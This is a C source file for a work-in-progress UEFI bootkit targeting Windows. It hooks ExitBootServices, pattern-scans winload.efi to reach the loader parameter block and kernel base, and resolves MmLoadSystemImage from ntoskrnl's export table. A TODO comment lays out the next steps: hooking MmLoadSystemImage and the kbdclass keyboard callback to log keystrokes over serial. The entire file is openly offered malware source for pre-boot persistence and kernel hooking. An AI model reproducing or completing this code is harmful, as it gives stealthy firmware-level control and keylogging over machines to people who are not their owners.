/**
 * Author: adi arnon.
 * Purpose: Bootkit :)
 * Date: 18/4/2026
 */

/********************************************************
 * Include
 ********************************************************/
#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/BaseLib.h>
#include <Library/DebugLib.h>
#include <Guid/EventGroup.h>
#include <IndustryStandard/PeImage.h>
#include <Library/IoLib.h>  

#include "Hook.h"

/********************************************************
 * Globals
 ********************************************************/
EFI_EXIT_BOOT_SERVICES originalExitBootServices = NULL;
UINT64 winloadReturnAddress = 0;
VOID * kernelBase = 0;

/********************************************************
 * Functions
 ********************************************************/
/**
 * TODO:
 * 1) Parse ntoskrnl PE to find any asset you want. (Write func for it)
 * https://ferreirasc.github.io/PE-Export-Address-Table/
 * 
 * 2) Find MmLoadSystemImage hook it using r10. (inline asm, chat)
 * 
 * 3) Every time hook catch check PsLoadedModuleList -> Prase it. Find "kbdclass.sys".
 * https://gist.github.com/muturikaranja/b7d4b59c72611e76aed94b2f0bf33aa2
 * 
 * 4) Set hook on Kbdclass!KeyboardClassServiceCallBack -> msdn read
 * https://phrack.org/issues/69/15
 * https://learn.microsoft.com/en-us/previous-versions/ff542324(v=vs.85) -> MSDN!!!!!!!
 * 5) Print chars using SerialWrite.
 */


VOID SerialWrite(CHAR8 *str)
{
    while (*str) {
        IoWrite8(COM1_PORT, *str++);
    }
}

VOID SerialWriteHex(UINT64 val)
{
    CHAR8 buf[16 + 3 + 2];
    CHAR8 hex[] = "0123456789ABCDEF";
    buf[0] = '0'; buf[1] = 'x';
    for (INT32 i = 17; i >= 2; i--) {
        buf[i] = hex[val & 0xF];
        val >>= 4;
    }
    buf[18] = '\n'; buf[19] = '\r'; buf[20] = 0;
    SerialWrite(buf);
}


VOID*
FindPattern(
    IN VOID   *Base,
    IN UINTN  Size,
    IN UINT8  *Pattern,
    IN UINTN  PatternSize
)
{
    UINT8 *Start = (UINT8*)Base;

    if (!Base || !Pattern || PatternSize == 0 || Size < PatternSize)
        return NULL;

    for (UINTN i = 0; i <= Size - PatternSize; i++)
    {
        if (CompareMem(Start + i, Pattern, PatternSize) == 0)
        {
            return (VOID*)(Start + i);
        }
    }

    return NULL;
}

VOID* EFIAPI FindNtosExportByName(VOID* kernelBase, CHAR8* exportName)
{
    SerialWrite("kernel base: ");
    SerialWriteHex((UINT64)kernelBase);
    EFI_IMAGE_DOS_HEADER* DosHeader = (EFI_IMAGE_DOS_HEADER*)kernelBase;  //PE starts with Dos Headers
    EFI_IMAGE_NT_HEADERS64* ntHeaders = (EFI_IMAGE_NT_HEADERS64*)((UINT8*)kernelBase + DosHeader->e_lfanew);
    UINT32 exportDirRva = ntHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRva == 0) {
        return NULL;
    }
    EFI_IMAGE_EXPORT_DIRECTORY* exportDir = (EFI_IMAGE_EXPORT_DIRECTORY*)((UINT8*)kernelBase + exportDirRva);
    
    UINT32* names = (UINT32*)((UINT8*)kernelBase + exportDir->AddressOfNames);
    UINT32* functions = (UINT32*)((UINT8*)kernelBase + exportDir->AddressOfFunctions);
    UINT16* ordinals = (UINT16*)((UINT8*)kernelBase + exportDir->AddressOfNameOrdinals);

    //loop on all names to find MmLoadSystemImage
    for (UINT32 i = 0; i < exportDir->NumberOfNames; i++) {
        CHAR8* currentName = (CHAR8*)((UINT8*)kernelBase + names[i]);
        
        if (AsciiStrCmp(currentName, exportName) == 0) {
            //found!!!
            UINT32 functionRva = functions[ordinals[i]];
            VOID* finalAddress = (VOID*)((UINT8*)kernelBase + functionRva);
            
            SerialWrite("Found Export: ");
            SerialWrite(exportName);
            SerialWrite(" at: ");
            SerialWriteHex((UINT64)finalAddress);
            
            return finalAddress;
        }
    }

    SerialWrite("Export NOT found\n");
    return NULL;
}



VOID EFIAPI NotifySetVirtualAddressMap(EFI_EVENT Event, VOID* Context)
{
    SerialWrite("winloadVA: ");
    SerialWriteHex(winloadReturnAddress);

    // Sig LogOsLanchScanBase func
    UINT8 sig[] = {0x48, 0xB8, 0x77, 0xBE, 0x9F, 0x1A, 0x2F, 0xDD};
     
    VOID * LogOsLanchScanBase = FindPattern(
        (VOID*)winloadReturnAddress,
        0x10000,
        sig,
        sizeof(sig)
    );

    if (LogOsLanchScanBase) {
        SerialWrite("LogOsLanchScanBase: ");
        SerialWriteHex(LogOsLanchScanBase);
    }
    PLOADER_PARAMETER_BLOCK loaderBlock = *(PLOADER_PARAMETER_BLOCK*)(*(UINT32*)(LogOsLanchScanBase + 0x10) + LogOsLanchScanBase + 0x14); 
    if (NULL == loaderBlock)
    {
        SerialWrite("FUCK loaderBlock\n");
    }
    KLDR_DATA_TABLE_ENTRY *kernelEntery =  CONTAINING_RECORD(loaderBlock->LoadOrderListHead.ForwardLink, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
    if (kernelEntery) {
        SerialWrite("kernel base address: ");
        SerialWriteHex(kernelEntery->DllBase);
        SerialWrite("kernel dump: ");
        SerialWriteHex(*((UINT32*)(kernelEntery->DllBase)));
        VOID* mmLoadAddress = FindNtosExportByName(kernelEntery->DllBase, "MmLoadSystemImage");
        if (mmLoadAddress) {
            SerialWrite("every thing good! now hook - next step \n");        
        }
}

}


EFI_STATUS EFIAPI HookedExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
{
    // returnAddress is somewhere inside winload.efi!OslFwpKernelSetupPhase1
    winloadReturnAddress = (UINT64)__builtin_return_address(0);
    Print(L"OslFwpKernelSetupPhase1   -> (phys) 0x%p\n", winloadReturnAddress);

    // restore before calling
    gBS->ExitBootServices = originalExitBootServices;

    return originalExitBootServices(ImageHandle, MapKey);
}

EFI_STATUS EFIAPI HookEntryPoint(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
{
    EFI_STATUS status;
    EFI_EVENT event;

    Print(L"\n\n\n");
    Print(L"================================================\n");
    Print(L"          BOOTKIT IS RUNNING                     \n");
    Print(L"          HookEntryPoint executed successfully!  \n");
    Print(L"================================================\n\n");

    status = gBS->CreateEvent(EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE, TPL_NOTIFY, NotifySetVirtualAddressMap, NULL, &event);

    if (EFI_ERROR(status)) {
        Print(L"[-] CreateEventEx(VirtualAddressChange) failed: %r\n", status);
        return status;
    }
    Print(L"[+] EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE registered\n");

    originalExitBootServices  = gBS->ExitBootServices;
    gBS->ExitBootServices     = HookedExitBootServices;
    Print(L"[+] HookedExitBootServices registered\n");


    return EFI_SUCCESS;
}